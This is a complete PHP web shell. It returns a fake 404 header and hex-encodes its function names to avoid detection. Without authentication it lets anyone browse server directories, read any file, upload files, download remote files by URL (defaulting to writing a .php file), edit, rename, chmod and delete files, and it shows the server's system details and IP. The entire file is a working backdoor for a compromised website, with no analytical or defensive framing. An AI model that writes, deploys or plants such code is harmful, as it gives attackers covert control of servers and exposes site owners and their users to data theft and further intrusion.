<?php
error_reporting(0);
set_time_limit(0);
header("HTTP/1.0 404 Not Found");

echo '<!DOCTYPE HTML>
<html>
<head>
    <title>$#$#$#</title>
    <link href="" rel="stylesheet" type="text/css">
    <style>
        body {
            font-family: "tahoma", cursive;
            background-color: black;
            color: white;
        }
        #content tr:hover {
            text-shadow: 0px 0px 10px;
        }
        #content .first {
            background-color: transparent; /* No background color */
        }
        table {
            border: 1px solid white; /* White border */
            border-collapse: collapse; /* Collapse borders */
        }
        td {
            border: 1px solid white; /* White border for table cells */
            padding: 5px; /* Add some padding */
        }
        a {
            color: white;
            text-decoration: none;
        }
        a:hover {
            color: darkcyan;
            text-shadow: 0px 0px 10px transparent;
        }
        input, select, textarea {
            border: 1px white solid;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <h1>
        <center>
            <font color="white"></font>
        </center>
    </h1>
    <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
        <tr>
            <td>
                <font color="white">Dir :</font> ';

$path = str_replace('\\', '/', $_GET['sepatusuper'] ?? getcwd());
$paths = explode('/', $path);

function uploadFileViaLink($fileUrl, $destinationPath) {
    try {

        $fileContent = "\x66\x69\x6C\x65\x5F\x67\x65\x74\x5F\x63\x6F\x6E\x74\x65\x6E\x74\x73"($fileUrl);
        
        if ($fileContent === false) {
            throw new Exception("Failed to retrieve file from URL: $fileUrl");
        }

        "\x66\x69\x6C\x65\x5F\x70\x75\x74\x5F\x63\x6F\x6E\x74\x65\x6E\x74\x73"($destinationPath, $fileContent);

        echo '<font color="darkgreen">URL Upload Succeeded</font><br />';
    } catch (Exception $e) {
        echo '<font color="red">URL Upload Failed: ' . $e->getMessage() . '</font><br />';
    }
}

foreach($paths as $id=>$pat){
	if($pat == '' && $id == 0){
		$a = true;
		echo '<a href="?sepatusuper=/">/</a>';
		continue;
	}
	if($pat == '') continue;
	echo '<a href="?sepatusuper=';
	for($i=0;$i<=$id;$i++){
		echo "$paths[$i]";
		if($i != $id) echo "/";
	}
	echo '">'.$pat.'</a>/';
} echo '</td></tr><tr><td>';
if (isset($_FILES['file'])) {
    $filename = "\x62\x61\x73\x65\x6E\x61\x6D\x65"($_FILES['file']['name']);
    $tmpName = $_FILES['file']['tmp_name'];

    $destinationPath = $path . '/' . $filename;
    if (rename($tmpName, $destinationPath)) {
        echo '<font color="darkgreen">Upload Succeeded</font><br />';
    } else {
        echo '<font color="red">Upload Failed</font><br />';
    }
} 

if (isset($_POST['fileUrl'])) {
    $fileUrl = $_POST['fileUrl'];
    $filename = "\x62\x61\x73\x65\x6E\x61\x6D\x65"($_POST['customFileName']);
    $destinationPath = $path . '/' . $filename;

    uploadFileViaLink($fileUrl, $destinationPath);
}

$ligma = $_SERVER['SERVER_ADDR'];
$wanem = php_uname();

echo 'Server: ' . $wanem .'<br>';
echo 'IP: ' . $ligma;

echo '<br><form enctype="multipart/form-data" method="POST">
		<font color="white">Choose File :</font> <input type="file" name="file" />
		<input type="submit" value="Upload" />
		</form>';

echo '<br><form method="POST">
        <font color="white">Url:</font>
        <input type="text" name="fileUrl" value="www.dombagarut.com" required />
        <input type="text" name="customFileName" value="filename.php" required />
        <input type="submit" value="WGET FILE" />
    </form>
    </td>
	</tr>';



if(isset($_GET['filesrc'])){
	echo "<tr><td>Dir : ";
	echo $_GET['filesrc'];
	echo '</tr></td></table><br />';
	echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
} elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
	echo '</table><br /><center>'.$_POST['sepatusuper'].'<br /><br />';
	if($_POST['opt'] == 'chmod'){
		if(isset($_POST['perm'])){
			if(chmod($_POST['sepatusuper'],$_POST['perm'])){
				echo '<font color="darkgreen">Change Permission Successful</font><br/>';
			} else{
				echo '<font color="red">Change Permission Failed</font><br />';
			}
		} echo '<form method="POST">
				Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['sepatusuper'])), -4).'" />
				<input type="hidden" name="sepatusuper" value="'.$_POST['sepatusuper'].'">
				<input type="hidden" name="opt" value="chmod">
				<input type="submit" value="Go" />
				</form>';
			} elseif($_POST['opt'] == 'rename'){
				if(isset($_POST['newname'])){
					if(rename($_POST['sepatusuper'],$path.'/'.$_POST['newname'])){
						echo '<font color="darkgreen">Rename Successfully</font><br/>';
					} else{
						echo '<font color="red">Rename Failed</font><br />';
					}
					$_POST['name'] = $_POST['newname'];
				} echo '<form method="POST">
						New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
						<input type="hidden" name="sepatusuper" value="'.$_POST['sepatusuper'].'">
						<input type="hidden" name="opt" value="rename">
						<input type="submit" value="Go" />
						</form>';
					} elseif($_POST['opt'] == 'edit'){
                        if (isset($_POST['src'])) {
                            $filePath = $_POST['sepatusuper'];
                            $data = "\x73\x74\x72\x69\x70\x73\x6c\x61\x73\x68\x65\x73"($_POST['src']);
                            $tempFile = tempnam(sys_get_temp_dir(), 'tempfile_');
                        
                            if (file_put_contents($tempFile, $data) !== false) {
                                if (rename($tempFile, $filePath)) {
                                    echo '<font color="darkgreen">Successfully Edit File</font><br/>';
                                } else {
                                    echo '<font color="red">Failed to replace the file.</font><br/>';
                                }
                            } else {
                                echo '<font color="red">Failed to write to temporary file.</font><br/>';
                            }
						} echo '<form method="POST">
								<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['sepatusuper'])).'</textarea><br />
								<input type="hidden" name="sepatusuper" value="'.$_POST['sepatusuper'].'">
								<input type="hidden" name="opt" value="edit">
								<input type="submit" value="Save" />
								</form>';
							} echo '</center>';
						} else{
							echo '</table><br/><center>';
							if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
								if($_POST['type'] == 'dir'){
									if(rmdir($_POST['sepatusuper'])){
										echo '<font color="darkgreen">Deleted Directory</font><br/>';
									} else{
										echo '<font color="red">Directory Failed Deleted</font><br/>';
									}
								} elseif($_POST['type'] == 'file'){
									if(unlink($_POST['sepatusuper'])){
										echo '<font color="darkgreen">Deleted Files</font><br/>';
									} else{
										echo '<font color="red">File Failed Deleted</font><br/>';
									}
								}
							} echo '</center>';
							$scandir = scandir($path);
							echo '<div id="content">
								  <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
								 	<tr class="first">
										<td>
											<center>Name</peller></center>
										</td>
										<td>
											<center>Size</peller></center>
										</td>
										<td>
											<center>Permission</peller></center>
										</td>
										<td>
											<center>Modify</peller></center>
										</td>
									</tr>';

foreach($scandir as $dir){
	if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
	echo '<tr>
		  <td><a href="?sepatusuper='.$path.'/'.$dir.'">'.$dir.'</a></td>
		  <td><center>--</center></td>
		  <td><center>';
		  if(is_writable($path.'/'.$dir)) echo '<font color="darkgreen">';
		  elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
		  echo perms($path.'/'.$dir);
		  if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
		  echo '</center></td>
		  		<td><center><form method="POST" action="?option&sepatusuper='.$path.'">
		  			<select name="opt">
		  				<option value="">Select</option>
						<option value="delete">Delete</option>
						<option value="chmod">Chmod</option>
						<option value="rename">Rename</option>
					</select>
					<input type="hidden" name="type" value="dir">
					<input type="hidden" name="name" value="'.$dir.'">
					<input type="hidden" name="sepatusuper" value="'.$path.'/'.$dir.'">
					<input type="submit" value=">">
					</form></center></td>
					</tr>';
				} echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';

foreach($scandir as $file){
	if(!is_file($path.'/'.$file)) continue;
	$size = filesize($path.'/'.$file)/1024;
	$size = round($size,3);
	if($size >= 1024){
		$size = round($size/1024,2).' MB';
	} else{
		$size = $size.' KB';
	} echo '<tr>
			<td><a href="?filesrc='.$path.'/'.$file.'&sepatusuper='.$path.'">'.$file.'</a></td>
			<td><center>'.$size.'</center></td>
			<td><center>';

if(is_writable($path.'/'.$file)) echo '<font color="darkgreen">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
	  <td><center><form method="POST" action="?option&sepatusuper='.$path.'">
	  <select name="opt">
	  	<option value="">Select</option>
	  	<option value="delete">Delete</option>
	  	<option value="chmod">Chmod</option>
	  	<option value="rename">Rename</option>
	  	<option value="edit">Edit</option>
	  </select>
	  <input type="hidden" name="type" value="file">
	  <input type="hidden" name="name" value="'.$file.'">
	  <input type="hidden" name="sepatusuper" value="'.$path.'/'.$file.'">
	  <input type="submit" value=">">
	  </form></center></td>
	  </tr>';
	} echo '</table></div>';
}

function perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
		$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
		$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
		$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
		$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
		$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
		$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
		$info = 'p';
	} else {
	// Unknown
		$info = 'u';
	}
	// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
		(($perms & 0x0800) ? 's' : 'x' ) :
		(($perms & 0x0800) ? 'S' : '-'));
		// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
		(($perms & 0x0400) ? 's' : 'x' ) :
		(($perms & 0x0400) ? 'S' : '-'));
		// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
		(($perms & 0x0200) ? 't' : 'x' ) :
		(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
?>
